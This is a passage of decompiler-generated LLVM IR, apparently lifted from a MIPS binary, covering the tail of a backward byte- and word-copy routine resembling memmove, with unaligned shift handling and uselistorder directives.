  %v2_4078b0 = load i8, i8* %v1_4078b0, align 1
  %v3_4078b0 = zext i8 %v2_4078b0 to i32
  store i32 %v3_4078b0, i32* %v0.global-to-local, align 4
  %v1_4078b4 = add i32 %v0_4078b4.pre, -1
  store i32 %v1_4078b4, i32* %t2.global-to-local, align 4
  %v3_4078b8 = inttoptr i32 %v1_4078b4 to i8*
  store i8 %v2_4078b0, i8* %v3_4078b8, align 1
  %v0_4078bc = load i32, i32* %v1.global-to-local, align 4
  %v1_4078bc = icmp eq i32 %v0_4078bc, 0
  %v3_4078bc = add i32 %v0_4078bc, -1
  store i32 %v3_4078bc, i32* %v1.global-to-local, align 4
  %v0_4078c4 = load i32, i32* %a1.global-to-local, align 4
  br i1 %v1_4078bc, label %dec_label_pc_4078c0, label %dec_label_pc_4078ac.dec_label_pc_4078ac_crit_edge

dec_label_pc_4078c0:                              ; preds = %dec_label_pc_4078ac.dec_label_pc_4078ac_crit_edge, %dec_label_pc_407898
  %v0_4078c4.lcssa = phi i32 [ %v0_4078c439, %dec_label_pc_407898 ], [ %v0_4078c4, %dec_label_pc_4078ac.dec_label_pc_4078ac_crit_edge ]
  %v1_4078c4 = urem i32 %v0_4078c4.lcssa, 4
  store i32 %v1_4078c4, i32* %v0.global-to-local, align 4
  %v1_4078c8 = icmp eq i32 %v1_4078c4, 0
  %v2_4078c8 = load i32, i32* %a2.global-to-local, align 4
  %v3_4078c8 = udiv i32 %v2_4078c8, 4
  store i32 %v3_4078c8, i32* %a3.global-to-local, align 4
  br i1 %v1_4078c8, label %dec_label_pc_4078cc, label %dec_label_pc_407a08

dec_label_pc_4078cc:                              ; preds = %dec_label_pc_4078c0
  %v1_4078d0 = urem i32 %v3_4078c8, 8
  store i32 %v1_4078d0, i32* %t1.global-to-local, align 4
  store i32 %v0_4078c4.lcssa, i32* %a0.global-to-local, align 4
  store i32 %v3_4078c8, i32* %t0.global-to-local, align 4
  %v1_4078ec = mul nuw nsw i32 %v1_4078d0, 4
  store i32 ptrtoint (i32* @global_var_408a90.400 to i32), i32* %v1.global-to-local, align 4
  %v2_4078f4 = add i32 %v1_4078ec, ptrtoint (i32* @global_var_408a90.400 to i32)
  store i32 %v2_4078f4, i32* %v0.global-to-local, align 4
  %v1_4078f8 = inttoptr i32 %v2_4078f4 to i32*
  %v2_4078f8 = load i32, i32* %v1_4078f8, align 4
  %v1_407900 = load i32, i32* %gp.global-to-local, align 4
  %v2_407900 = add i32 %v1_407900, %v2_4078f8
  store i32 %v2_407900, i32* %v0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_407900)
  store i32 0, i32* %t1.global-to-local, align 4
  %v0_407914 = load i32, i32* %a1.global-to-local, align 4
  %v1_407914 = add i32 %v0_407914, -8
  store i32 %v1_407914, i32* %a0.global-to-local, align 4
  %v1_407918 = add i32 %v0_407914, -4
  %v2_407918 = inttoptr i32 %v1_407918 to i32*
  %v3_407918 = load i32, i32* %v2_407918, align 4
  store i32 %v3_407918, i32* %v0.global-to-local, align 4
  %v0_40791c = load i32, i32* %a3.global-to-local, align 4
  %v1_40791c = add i32 %v0_40791c, 6
  store i32 %v1_40791c, i32* %t0.global-to-local, align 4
  %v0_407924 = load i32, i32* %t2.global-to-local, align 4
  %v1_407924 = add i32 %v0_407924, -4
  store i32 %v1_407924, i32* %v1.global-to-local, align 4
  %v1_407928 = add i32 %v0_407914, -12
  store i32 %v1_407928, i32* %a0.global-to-local, align 4
  %v3_40792c = load i32, i32* %v2_407918, align 4
  store i32 %v3_40792c, i32* %t1.global-to-local, align 4
  %v1_407930 = add i32 %v0_40791c, 5
  store i32 %v1_407930, i32* %t0.global-to-local, align 4
  %v1_407938 = add i32 %v0_407924, -8
  store i32 %v1_407938, i32* %v1.global-to-local, align 4
  %v1_40793c = add i32 %v0_407914, -16
  store i32 %v1_40793c, i32* %a0.global-to-local, align 4
  %v3_407940 = load i32, i32* %v2_407918, align 4
  store i32 %v3_407940, i32* %v0.global-to-local, align 4
  %v1_407944 = add i32 %v0_40791c, 4
  store i32 %v1_407944, i32* %t0.global-to-local, align 4
  %v1_40794c = add i32 %v0_407924, -12
  store i32 %v1_40794c, i32* %v1.global-to-local, align 4
  %v1_407950 = add i32 %v0_407914, -20
  store i32 %v1_407950, i32* %a0.global-to-local, align 4
  %v3_407954 = load i32, i32* %v2_407918, align 4
  store i32 %v3_407954, i32* %t1.global-to-local, align 4
  %v1_407958 = add i32 %v0_40791c, 3
  store i32 %v1_407958, i32* %t0.global-to-local, align 4
  %v1_407960 = add i32 %v0_407924, -16
  store i32 %v1_407960, i32* %v1.global-to-local, align 4
  %v1_407964 = add i32 %v0_407914, -24
  store i32 %v1_407964, i32* %a0.global-to-local, align 4
  %v3_407968 = load i32, i32* %v2_407918, align 4
  store i32 %v3_407968, i32* %v0.global-to-local, align 4
  %v1_40796c = add i32 %v0_40791c, 2
  store i32 %v1_40796c, i32* %t0.global-to-local, align 4
  %v1_407974 = add i32 %v0_407924, -20
  store i32 %v1_407974, i32* %v1.global-to-local, align 4
  %v1_407978 = add i32 %v0_407914, -28
  store i32 %v1_407978, i32* %a0.global-to-local, align 4
  %v3_40797c = load i32, i32* %v2_407918, align 4
  store i32 %v3_40797c, i32* %t1.global-to-local, align 4
  %v1_407980 = add i32 %v0_40791c, 1
  store i32 %v1_407980, i32* %t0.global-to-local, align 4
  %v1_407988 = add i32 %v0_407924, -24
  store i32 %v1_407988, i32* %v1.global-to-local, align 4
  %v1_40798c = add i32 %v0_407914, -32
  store i32 %v1_40798c, i32* %a0.global-to-local, align 4
  %v3_407990 = load i32, i32* %v2_407918, align 4
  store i32 %v3_407990, i32* %v0.global-to-local, align 4
  %v1_407998 = add i32 %v0_407924, -28
  store i32 %v1_407998, i32* %v1.global-to-local, align 4
  %v1_40799c = add i32 %v0_407914, -36
  store i32 %v1_40799c, i32* %a0.global-to-local, align 4
  %v3_4079a0 = load i32, i32* %v2_407918, align 4
  store i32 %v3_4079a0, i32* %t1.global-to-local, align 4
  %v1_4079a4 = add i32 %v0_40791c, -1
  store i32 %v1_4079a4, i32* %t0.global-to-local, align 4
  %v1_4079a8 = add i32 %v0_407924, -32
  store i32 %v1_4079a8, i32* %v1.global-to-local, align 4
  %v2_4079ac = inttoptr i32 %v1_407914 to i32*
  %v3_4079ac = load i32, i32* %v2_4079ac, align 4
  store i32 %v3_4079ac, i32* %v0.global-to-local, align 4
  %v3_4079b0 = inttoptr i32 %v1_407924 to i32*
  store i32 %v3_4079a0, i32* %v3_4079b0, align 4
  %v0_4079b4 = load i32, i32* %a0.global-to-local, align 4
  %v1_4079b4 = add i32 %v0_4079b4, 24
  %v2_4079b4 = inttoptr i32 %v1_4079b4 to i32*
  %v3_4079b4 = load i32, i32* %v2_4079b4, align 4
  store i32 %v3_4079b4, i32* %t1.global-to-local, align 4
  %v0_4079b8 = load i32, i32* %v0.global-to-local, align 4
  %v1_4079b8 = load i32, i32* %v1.global-to-local, align 4
  %v2_4079b8 = add i32 %v1_4079b8, 24
  %v3_4079b8 = inttoptr i32 %v2_4079b8 to i32*
  store i32 %v0_4079b8, i32* %v3_4079b8, align 4
  %v0_4079bc = load i32, i32* %a0.global-to-local, align 4
  %v1_4079bc = add i32 %v0_4079bc, 20
  %v2_4079bc = inttoptr i32 %v1_4079bc to i32*
  %v3_4079bc = load i32, i32* %v2_4079bc, align 4
  store i32 %v3_4079bc, i32* %v0.global-to-local, align 4
  %v0_4079c0 = load i32, i32* %t1.global-to-local, align 4
  %v1_4079c0 = load i32, i32* %v1.global-to-local, align 4
  %v2_4079c0 = add i32 %v1_4079c0, 20
  %v3_4079c0 = inttoptr i32 %v2_4079c0 to i32*
  store i32 %v0_4079c0, i32* %v3_4079c0, align 4
  %v0_4079c4 = load i32, i32* %a0.global-to-local, align 4
  %v1_4079c4 = add i32 %v0_4079c4, 16
  %v2_4079c4 = inttoptr i32 %v1_4079c4 to i32*
  %v3_4079c4 = load i32, i32* %v2_4079c4, align 4
  store i32 %v3_4079c4, i32* %t1.global-to-local, align 4
  %v0_4079c8 = load i32, i32* %v0.global-to-local, align 4
  %v1_4079c8 = load i32, i32* %v1.global-to-local, align 4
  %v2_4079c8 = add i32 %v1_4079c8, 16
  %v3_4079c8 = inttoptr i32 %v2_4079c8 to i32*
  store i32 %v0_4079c8, i32* %v3_4079c8, align 4
  %v0_4079cc = load i32, i32* %a0.global-to-local, align 4
  %v1_4079cc = add i32 %v0_4079cc, 12
  %v2_4079cc = inttoptr i32 %v1_4079cc to i32*
  %v3_4079cc = load i32, i32* %v2_4079cc, align 4
  store i32 %v3_4079cc, i32* %v0.global-to-local, align 4
  %v0_4079d0 = load i32, i32* %t1.global-to-local, align 4
  %v1_4079d0 = load i32, i32* %v1.global-to-local, align 4
  %v2_4079d0 = add i32 %v1_4079d0, 12
  %v3_4079d0 = inttoptr i32 %v2_4079d0 to i32*
  store i32 %v0_4079d0, i32* %v3_4079d0, align 4
  %v0_4079d4 = load i32, i32* %a0.global-to-local, align 4
  %v1_4079d4 = add i32 %v0_4079d4, 8
  %v2_4079d4 = inttoptr i32 %v1_4079d4 to i32*
  %v3_4079d4 = load i32, i32* %v2_4079d4, align 4
  store i32 %v3_4079d4, i32* %t1.global-to-local, align 4
  %v0_4079d8 = load i32, i32* %v0.global-to-local, align 4
  %v1_4079d8 = load i32, i32* %v1.global-to-local, align 4
  %v2_4079d8 = add i32 %v1_4079d8, 8
  %v3_4079d8 = inttoptr i32 %v2_4079d8 to i32*
  store i32 %v0_4079d8, i32* %v3_4079d8, align 4
  %v0_4079dc = load i32, i32* %a0.global-to-local, align 4
  %v1_4079dc = add i32 %v0_4079dc, 4
  %v2_4079dc = inttoptr i32 %v1_4079dc to i32*
  %v3_4079dc = load i32, i32* %v2_4079dc, align 4
  store i32 %v3_4079dc, i32* %v0.global-to-local, align 4
  %v0_4079e0 = load i32, i32* %t1.global-to-local, align 4
  %v1_4079e0 = load i32, i32* %v1.global-to-local, align 4
  %v2_4079e0 = add i32 %v1_4079e0, 4
  %v3_4079e0 = inttoptr i32 %v2_4079e0 to i32*
  store i32 %v0_4079e0, i32* %v3_4079e0, align 4
  %v0_4079e4 = load i32, i32* %t0.global-to-local, align 4
  %v1_4079e4 = add i32 %v0_4079e4, -8
  store i32 %v1_4079e4, i32* %t0.global-to-local, align 4
  %v0_4079e8 = load i32, i32* %a0.global-to-local, align 4
  %v1_4079e8 = inttoptr i32 %v0_4079e8 to i32*
  %v2_4079e8 = load i32, i32* %v1_4079e8, align 4
  store i32 %v2_4079e8, i32* %t1.global-to-local, align 4
  %v0_4079ec = load i32, i32* %v0.global-to-local, align 4
  %v1_4079ec = load i32, i32* %v1.global-to-local, align 4
  %v2_4079ec = inttoptr i32 %v1_4079ec to i32*
  store i32 %v0_4079ec, i32* %v2_4079ec, align 4
  %v0_4079f0 = load i32, i32* %t0.global-to-local, align 4
  %v1_4079f0 = icmp eq i32 %v0_4079f0, 0
  %v2_4079f0 = load i32, i32* %v1.global-to-local, align 4
  %v3_4079f0 = add i32 %v2_4079f0, -32
  store i32 %v3_4079f0, i32* %v1.global-to-local, align 4
  br i1 %v1_4079f0, label %dec_label_pc_407a00, label %dec_label_pc_4079f4

dec_label_pc_4079f4:                              ; preds = %dec_label_pc_4078cc
  %v0_4079fc = load i32, i32* %a0.global-to-local, align 4
  %v1_4079fc = add i32 %v0_4079fc, -32
  store i32 %v1_4079fc, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407a00

dec_label_pc_407a00:                              ; preds = %dec_label_pc_4078cc, %dec_label_pc_4079f4
  %v0_407a04 = load i32, i32* %t1.global-to-local, align 4
  %v2_407a04 = add i32 %v2_4079f0, -4
  %v3_407a04 = inttoptr i32 %v2_407a04 to i32*
  store i32 %v0_407a04, i32* %v3_407a04, align 4
  %v0_407a08.pre = load i32, i32* %v0.global-to-local, align 4
  %v0_407a10.pre = load i32, i32* %a1.global-to-local, align 4
  %v0_407a18.pre = load i32, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_407a08

dec_label_pc_407a08:                              ; preds = %dec_label_pc_4078c0, %dec_label_pc_407a00
  %v0_407a64 = phi i32 [ %v3_4078c8, %dec_label_pc_4078c0 ], [ %v0_407a18.pre, %dec_label_pc_407a00 ]
  %v0_407a10 = phi i32 [ %v0_4078c4.lcssa, %dec_label_pc_4078c0 ], [ %v0_407a10.pre, %dec_label_pc_407a00 ]
  %v0_407a08 = phi i32 [ %v1_4078c4, %dec_label_pc_4078c0 ], [ %v0_407a08.pre, %dec_label_pc_407a00 ]
  %v1_407a08 = mul i32 %v0_407a08, 8
  store i32 %v1_407a08, i32* %t4.global-to-local, align 4
  %v2_407a10 = and i32 %v0_407a10, -4
  store i32 %v2_407a10, i32* %t0.global-to-local, align 4
  %v1_407a18 = urem i32 %v0_407a64, 4
  store i32 %v1_407a18, i32* %v1.global-to-local, align 4
  %v2_407a1c = sub i32 32, %v1_407a08
  store i32 %v2_407a1c, i32* %t5.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  store i32 %v0_407a64, i32* %t3.global-to-local, align 4
  %v1_407a28 = add i32 %v2_407a10, 4
  store i32 %v1_407a28, i32* %a0.global-to-local, align 4
  %v2_407a2c = icmp eq i32 %v1_407a18, 1
  %v3_407a2c = load i32, i32* %t2.global-to-local, align 4
  store i32 %v3_407a2c, i32* %a3.global-to-local, align 4
  br i1 %v2_407a2c, label %dec_label_pc_407a9c, label %dec_label_pc_407a30

dec_label_pc_407a30:                              ; preds = %dec_label_pc_407a08
  %v1_407a34 = icmp eq i32 %v1_407a18, 0
  store i32 2, i32* %v0.global-to-local, align 4
  br i1 %v1_407a34, label %dec_label_pc_407a88, label %dec_label_pc_407a38

dec_label_pc_407a38:                              ; preds = %dec_label_pc_407a30
  store i32 3, i32* %v0.global-to-local, align 4
  %trunc = trunc i32 %v0_407a64 to i2
  switch i2 %trunc, label %dec_label_pc_407a48 [
    i2 -2, label %dec_label_pc_407a58
    i2 -1, label %dec_label_pc_407a70
  ]

dec_label_pc_407a48:                              ; preds = %dec_label_pc_407a38
  store i32 0, i32* %t1.global-to-local, align 4
  store i32 0, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_407a58

dec_label_pc_407a58:                              ; preds = %dec_label_pc_407a38, %dec_label_pc_407a48
  %v0_407a58 = phi i32 [ %v2_407a10, %dec_label_pc_407a38 ], [ 0, %dec_label_pc_407a48 ]
  %v1_407a58 = add i32 %v0_407a58, -8
  store i32 %v1_407a58, i32* %a0.global-to-local, align 4
  %v2_407a5c = inttoptr i32 %v0_407a58 to i32*
  %v3_407a5c = load i32, i32* %v2_407a5c, align 4
  store i32 %v3_407a5c, i32* %t1.global-to-local, align 4
  %v1_407a60 = add i32 %v0_407a58, -4
  %v2_407a60 = inttoptr i32 %v1_407a60 to i32*
  %v3_407a60 = load i32, i32* %v2_407a60, align 4
  store i32 %v3_407a60, i32* %t0.global-to-local, align 4
  %v1_407a64 = add i32 %v0_407a64, 2
  store i32 %v1_407a64, i32* %t3.global-to-local, align 4
  %v1_407a6c = add i32 %v3_407a2c, -4
  store i32 %v1_407a6c, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_407a70

dec_label_pc_407a70:                              ; preds = %dec_label_pc_407a38, %dec_label_pc_407a58
  %v0_407a7c = phi i32 [ %v1_407a64, %dec_label_pc_407a58 ], [ %v0_407a64, %dec_label_pc_407a38 ]
  %v0_407a70 = phi i32 [ %v3_407a60, %dec_label_pc_407a58 ], [ %v2_407a10, %dec_label_pc_407a38 ]
  %v1_407a70 = add i32 %v0_407a70, -12
  store i32 %v1_407a70, i32* %a0.global-to-local, align 4
  %v2_407a74 = inttoptr i32 %v0_407a70 to i32*
  %v3_407a74 = load i32, i32* %v2_407a74, align 4
  store i32 %v3_407a74, i32* %t0.global-to-local, align 4
  %v1_407a78 = add i32 %v0_407a70, -4
  %v2_407a78 = inttoptr i32 %v1_407a78 to i32*
  %v3_407a78 = load i32, i32* %v2_407a78, align 4
  store i32 %v3_407a78, i32* %t1.global-to-local, align 4
  %v1_407a7c = add i32 %v0_407a7c, 1
  store i32 %v1_407a7c, i32* %t3.global-to-local, align 4
  %v1_407a84 = add i32 %v3_407a2c, -8
  store i32 %v1_407a84, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_407a88

dec_label_pc_407a88:                              ; preds = %dec_label_pc_407a30, %dec_label_pc_407a70
  %v0_407aa811 = phi i32 [ %v0_407a64, %dec_label_pc_407a30 ], [ %v1_407a7c, %dec_label_pc_407a70 ]
  %v0_407a88 = phi i32 [ %v2_407a10, %dec_label_pc_407a30 ], [ %v3_407a74, %dec_label_pc_407a70 ]
  %v1_407a88 = add i32 %v0_407a88, -16
  store i32 %v1_407a88, i32* %a0.global-to-local, align 4
  %v2_407a8c = inttoptr i32 %v0_407a88 to i32*
  %v3_407a8c = load i32, i32* %v2_407a8c, align 4
  store i32 %v3_407a8c, i32* %t1.global-to-local, align 4
  %v1_407a90 = add i32 %v0_407a88, -4
  %v2_407a90 = inttoptr i32 %v1_407a90 to i32*
  %v3_407a90 = load i32, i32* %v2_407a90, align 4
  store i32 %v3_407a90, i32* %t0.global-to-local, align 4
  %v1_407a98 = add i32 %v3_407a2c, -12
  store i32 %v1_407a98, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_407a9c

dec_label_pc_407a9c:                              ; preds = %dec_label_pc_407a08, %dec_label_pc_407a88
  %v0_407aa8 = phi i32 [ %v0_407a64, %dec_label_pc_407a08 ], [ %v0_407aa811, %dec_label_pc_407a88 ]
  %v0_407a9c = phi i32 [ %v2_407a10, %dec_label_pc_407a08 ], [ %v3_407a90, %dec_label_pc_407a88 ]
  %v1_407a9c = add i32 %v0_407a9c, -20
  store i32 %v1_407a9c, i32* %a0.global-to-local, align 4
  %v2_407aa0 = inttoptr i32 %v0_407a9c to i32*
  %v3_407aa0 = load i32, i32* %v2_407aa0, align 4
  store i32 %v3_407aa0, i32* %t0.global-to-local, align 4
  %v1_407aa4 = add i32 %v0_407a9c, -4
  %v2_407aa4 = inttoptr i32 %v1_407aa4 to i32*
  %v3_407aa4 = load i32, i32* %v2_407aa4, align 4
  store i32 %v3_407aa4, i32* %t1.global-to-local, align 4
  %v1_407aa8 = add i32 %v0_407aa8, -1
  store i32 %v1_407aa8, i32* %t3.global-to-local, align 4
  %v1_407aac = add i32 %v3_407a2c, -16
  store i32 %v1_407aac, i32* %a3.global-to-local, align 4
  %v2_407ab0 = lshr i32 %v3_407aa0, %v2_407a1c
  store i32 %v2_407ab0, i32* %v1.global-to-local, align 4
  %v2_407ab4 = shl i32 %v3_407aa4, %v1_407a08
  %v2_407ab8 = or i32 %v2_407ab4, %v2_407ab0
  store i32 %v2_407ab8, i32* %v0.global-to-local, align 4
  %v1_407abc = add i32 %v0_407a9c, -8
  %v2_407abc = inttoptr i32 %v1_407abc to i32*
  %v3_407abc = load i32, i32* %v2_407abc, align 4
  store i32 %v3_407abc, i32* %t0.global-to-local, align 4
  %v2_407ac0 = add i32 %v3_407a2c, -4
  %v3_407ac0 = inttoptr i32 %v2_407ac0 to i32*
  store i32 %v2_407ab8, i32* %v3_407ac0, align 4
  %v0_407ac4 = load i32, i32* %t1.global-to-local, align 4
  %v1_407ac4 = load i32, i32* %t5.global-to-local, align 4
  %v2_407ac4 = lshr i32 %v0_407ac4, %v1_407ac4
  store i32 %v2_407ac4, i32* %v1.global-to-local, align 4
  %v0_407ac8 = load i32, i32* %t0.global-to-local, align 4
  %v1_407ac8 = load i32, i32* %t4.global-to-local, align 4
  %v2_407ac8 = shl i32 %v0_407ac8, %v1_407ac8
  %v2_407acc = or i32 %v2_407ac8, %v2_407ac4
  store i32 %v2_407acc, i32* %v0.global-to-local, align 4
  %v0_407ad0 = load i32, i32* %a0.global-to-local, align 4
  %v1_407ad0 = add i32 %v0_407ad0, 8
  %v2_407ad0 = inttoptr i32 %v1_407ad0 to i32*
  %v3_407ad0 = load i32, i32* %v2_407ad0, align 4
  store i32 %v3_407ad0, i32* %t1.global-to-local, align 4
  %v1_407ad4 = load i32, i32* %a3.global-to-local, align 4
  %v2_407ad4 = add i32 %v1_407ad4, 8
  %v3_407ad4 = inttoptr i32 %v2_407ad4 to i32*
  store i32 %v2_407acc, i32* %v3_407ad4, align 4
  %v0_407ad8 = load i32, i32* %t0.global-to-local, align 4
  %v1_407ad8 = load i32, i32* %t5.global-to-local, align 4
  %v2_407ad8 = lshr i32 %v0_407ad8, %v1_407ad8
  store i32 %v2_407ad8, i32* %v1.global-to-local, align 4
  %v0_407adc = load i32, i32* %t1.global-to-local, align 4
  %v1_407adc = load i32, i32* %t4.global-to-local, align 4
  %v2_407adc = shl i32 %v0_407adc, %v1_407adc
  %v2_407ae0 = or i32 %v2_407adc, %v2_407ad8
  store i32 %v2_407ae0, i32* %v0.global-to-local, align 4
  %v0_407ae4 = load i32, i32* %a0.global-to-local, align 4
  %v1_407ae4 = add i32 %v0_407ae4, 4
  %v2_407ae4 = inttoptr i32 %v1_407ae4 to i32*
  %v3_407ae4 = load i32, i32* %v2_407ae4, align 4
  store i32 %v3_407ae4, i32* %t0.global-to-local, align 4
  %v1_407ae8 = load i32, i32* %a3.global-to-local, align 4
  %v2_407ae8 = add i32 %v1_407ae8, 4
  %v3_407ae8 = inttoptr i32 %v2_407ae8 to i32*
  store i32 %v2_407ae0, i32* %v3_407ae8, align 4
  %v0_407aec = load i32, i32* %t1.global-to-local, align 4
  %v1_407aec = load i32, i32* %t5.global-to-local, align 4
  %v2_407aec = lshr i32 %v0_407aec, %v1_407aec
  store i32 %v2_407aec, i32* %v1.global-to-local, align 4
  %v0_407af0 = load i32, i32* %t0.global-to-local, align 4
  %v1_407af0 = load i32, i32* %t4.global-to-local, align 4
  %v2_407af0 = shl i32 %v0_407af0, %v1_407af0
  %v2_407af4 = or i32 %v2_407af0, %v2_407aec
  store i32 %v2_407af4, i32* %v0.global-to-local, align 4
  %v0_407af8 = load i32, i32* %t3.global-to-local, align 4
  %v1_407af8 = add i32 %v0_407af8, -4
  store i32 %v1_407af8, i32* %t3.global-to-local, align 4
  %v0_407afc = load i32, i32* %a0.global-to-local, align 4
  %v1_407afc = inttoptr i32 %v0_407afc to i32*
  %v2_407afc = load i32, i32* %v1_407afc, align 4
  store i32 %v2_407afc, i32* %t1.global-to-local, align 4
  %v1_407b00 = load i32, i32* %a3.global-to-local, align 4
  %v2_407b00 = inttoptr i32 %v1_407b00 to i32*
  store i32 %v2_407af4, i32* %v2_407b00, align 4
  %v0_407b04 = load i32, i32* %t3.global-to-local, align 4
  %v1_407b04 = icmp eq i32 %v0_407b04, 0
  %v2_407b04 = load i32, i32* %a3.global-to-local, align 4
  %v3_407b04 = add i32 %v2_407b04, -16
  store i32 %v3_407b04, i32* @a3, align 4
  br i1 %v1_407b04, label %dec_label_pc_407b14, label %dec_label_pc_407b08

dec_label_pc_407b08:                              ; preds = %dec_label_pc_407a9c
  %v0_407b10 = load i32, i32* %a0.global-to-local, align 4
  %v1_407b10 = add i32 %v0_407b10, -16
  store i32 %v1_407b10, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407b14

dec_label_pc_407b14:                              ; preds = %dec_label_pc_407a9c, %dec_label_pc_407b08
  %v0_407b14 = load i32, i32* %t1.global-to-local, align 4
  %v1_407b14 = load i32, i32* %t4.global-to-local, align 4
  %v2_407b14 = shl i32 %v0_407b14, %v1_407b14
  %v0_407b18 = load i32, i32* %t0.global-to-local, align 4
  %v1_407b18 = load i32, i32* %t5.global-to-local, align 4
  %v2_407b18 = lshr i32 %v0_407b18, %v1_407b18
  %v2_407b1c = or i32 %v2_407b18, %v2_407b14
  %v2_407b20 = add i32 %v2_407b04, -4
  %v3_407b20 = inttoptr i32 %v2_407b20 to i32*
  store i32 %v2_407b1c, i32* %v3_407b20, align 4
  %v0_407b28 = load i32, i32* %a2.global-to-local, align 4
  %v2_407b28 = and i32 %v0_407b28, -4
  store i32 %v2_407b28, i32* %v0.global-to-local, align 4
  %v0_407b2c = load i32, i32* %t2.global-to-local, align 4
  %v2_407b2c = sub i32 %v0_407b2c, %v2_407b28
  store i32 %v2_407b2c, i32* %t2.global-to-local, align 4
  %v0_407b30 = load i32, i32* %a1.global-to-local, align 4
  %v2_407b30 = sub i32 %v0_407b30, %v2_407b28
  store i32 %v2_407b30, i32* %a1.global-to-local, align 4
  %v1_407b34 = urem i32 %v0_407b28, 4
  store i32 %v1_407b34, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_407b38

dec_label_pc_407b38:                              ; preds = %dec_label_pc_40788c.dec_label_pc_407b38_crit_edge, %dec_label_pc_407b14
  %v0_407b4417 = phi i32 [ %v4_407894, %dec_label_pc_40788c.dec_label_pc_407b38_crit_edge ], [ %v2_407b2c, %dec_label_pc_407b14 ]
  %v0_407b4014 = phi i32 [ %v2_407890, %dec_label_pc_40788c.dec_label_pc_407b38_crit_edge ], [ %v2_407b30, %dec_label_pc_407b14 ]
  %v0_407b3c = phi i32 [ %v0_407b3c.pre, %dec_label_pc_40788c.dec_label_pc_407b38_crit_edge ], [ %v1_407b34, %dec_label_pc_407b14 ]
  store i32 %v0_407b3c, i32* %a2.global-to-local, align 4
  %v1_407b4019 = inttoptr i32 %v0_407b4014 to i8*
  %v2_407b4020 = load i8, i8* %v1_407b4019, align 1
  %v3_407b4021 = zext i8 %v2_407b4020 to i32
  store i32 %v3_407b4021, i32* %v0.global-to-local, align 4
  %v1_407b4422 = add i32 %v0_407b4417, -1
  store i32 %v1_407b4422, i32* %t2.global-to-local, align 4
  %v3_407b4823 = inttoptr i32 %v1_407b4422 to i8*
  store i8 %v2_407b4020, i8* %v3_407b4823, align 1
  %v0_407b4c24 = load i32, i32* %a2.global-to-local, align 4
  %v1_407b4c25 = add i32 %v0_407b4c24, -1
  store i32 %v1_407b4c25, i32* %a2.global-to-local, align 4
  %v1_407b5026 = icmp eq i32 %v1_407b4c25, 0
  %v2_407b5027 = load i32, i32* %a1.global-to-local, align 4
  %v3_407b5028 = add i32 %v2_407b5027, -1
  store i32 %v3_407b5028, i32* %a1.global-to-local, align 4
  br i1 %v1_407b5026, label %dec_label_pc_407b54, label %dec_label_pc_407b40.dec_label_pc_407b40_crit_edge

dec_label_pc_407b40.dec_label_pc_407b40_crit_edge: ; preds = %dec_label_pc_407b38, %dec_label_pc_407b40.dec_label_pc_407b40_crit_edge
  %v3_407b5029 = phi i32 [ %v3_407b50, %dec_label_pc_407b40.dec_label_pc_407b40_crit_edge ], [ %v3_407b5028, %dec_label_pc_407b38 ]
  %v0_407b44.pre = load i32, i32* %t2.global-to-local, align 4
  %v1_407b40 = inttoptr i32 %v3_407b5029 to i8*
  %v2_407b40 = load i8, i8* %v1_407b40, align 1
  %v3_407b40 = zext i8 %v2_407b40 to i32
  store i32 %v3_407b40, i32* %v0.global-to-local, align 4
  %v1_407b44 = add i32 %v0_407b44.pre, -1
  store i32 %v1_407b44, i32* %t2.global-to-local, align 4
  %v3_407b48 = inttoptr i32 %v1_407b44 to i8*
  store i8 %v2_407b40, i8* %v3_407b48, align 1
  %v0_407b4c = load i32, i32* %a2.global-to-local, align 4
  %v1_407b4c = add i32 %v0_407b4c, -1
  store i32 %v1_407b4c, i32* %a2.global-to-local, align 4
  %v1_407b50 = icmp eq i32 %v1_407b4c, 0
  %v2_407b50 = load i32, i32* %a1.global-to-local, align 4
  %v3_407b50 = add i32 %v2_407b50, -1
  store i32 %v3_407b50, i32* %a1.global-to-local, align 4
  br i1 %v1_407b50, label %dec_label_pc_407b54, label %dec_label_pc_407b40.dec_label_pc_407b40_crit_edge

dec_label_pc_407b54:                              ; preds = %dec_label_pc_407b40.dec_label_pc_407b40_crit_edge, %dec_label_pc_407b38
  %v2_407b50.lcssa = phi i32 [ %v2_407b5027, %dec_label_pc_407b38 ], [ %v2_407b50, %dec_label_pc_407b40.dec_label_pc_407b40_crit_edge ]
  store i32 %v2_407b50.lcssa, i32* %a1.global-to-local, align 4
  %v0_407b5c = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_407b5c, i32* %v0.global-to-local, align 4
  ret i32 %v0_407b5c

; uselistorder directives
  uselistorder i32 %v3_407b50, { 1, 0 }
  uselistorder i32 %v1_407b34, { 1, 0 }
  uselistorder i32 %v0_407a9c, { 0, 3, 2, 1 }
  uselistorder i32 %v0_407a88, { 2, 1, 0 }
  uselistorder i32 %v0_407a70, { 2, 1, 0 }
  uselistorder i32 %v0_407a58, { 2, 1, 0 }
  uselistorder i32 %v1_407a18, { 2, 1, 0 }
  uselistorder i32 %v2_407a10, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_407a08, { 2, 1, 0 }
  uselistorder i32 %v0_407a64, { 4, 3, 2, 5, 1, 6, 0 }
  uselistorder i32 %v3_4078c8, { 3, 2, 0, 1 }
  uselistorder i32 %v1_4078c4, { 2, 1, 0 }
  uselistorder i32 %v0_4078c4.lcssa, { 2, 1, 0 }
  uselistorder i32 %v1_40789c, { 2, 1, 0 }
  uselistorder i32 %v4_407894, { 2, 1, 0, 3 }
  uselistorder i32 %v2_407890, { 1, 0, 2 }
  uselistorder i32* %v1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 14, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 29, 30, 25, 26, 27, 28 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 31, 2, 3, 4, 5, 6, 7, 9, 8, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 32, 27, 28, 29, 30 }
